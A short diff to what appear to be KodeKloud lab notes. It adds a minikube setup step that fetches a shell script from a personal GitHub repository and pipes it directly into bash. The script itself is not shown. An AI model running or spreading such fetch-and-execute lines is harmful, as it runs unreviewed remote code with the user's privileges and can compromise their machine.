@@ -1,4 +1,6 @@
 # KodeKloud lab – Day 1
+#setup minikube:
+curl -s https://raw.githubusercontent.com/sivakumaranrg/chatgpt_mentor-mode/master/ec2.sh | bash
 
 ## Reproduce
 
